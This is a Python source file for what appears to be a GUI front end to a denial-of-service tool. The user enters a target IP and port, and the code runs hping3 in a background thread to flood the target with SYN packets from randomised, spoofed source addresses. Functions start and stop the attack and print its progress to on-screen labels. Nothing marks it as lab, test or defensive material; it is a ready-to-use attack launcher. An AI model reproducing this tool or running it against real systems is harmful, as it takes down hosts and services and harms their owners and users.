from scapy.all import *
from tkinter import *
import signal
import threading
import subprocess

def startSynFlood(targetIp, port, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global synFloodThreads, terminalLabel, errorOutputLabel

    synFloodThreads = threading.Thread(target = lambda : sendSynPackets(targetIp, port))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running Syn Flood Attack...\n"

    runSynFloodAttack()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopSynFlood() :
    global synFloodThreads

    try:
        terminalLabel["text"] += "\n$ Stopping Syn Flood Attack...\n\n"
        synFloodThreads.join(0)
        synFloodThreads = None

        process.send_signal(signal.SIGINT)

        terminalLabel["text"] += "$ Syn Flood Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runSynFloodAttack() :
    global synFloodThreads, synFloodIsRunning
    synFloodIsRunning = True
    terminalLabel["text"] += "$ Activating Threads\n\n"
    synFloodThreads.start()

def sendSynPackets(targetIp, port) :
    global process
    terminalLabel["text"] += "$ Target IP : " + targetIp + "\n"
    terminalLabel["text"] += "$ Target Port : " + port + "\n"
    process = subprocess.Popen(["hping3", "-S", "-p", port, "--flood", "--rand-source", targetIp])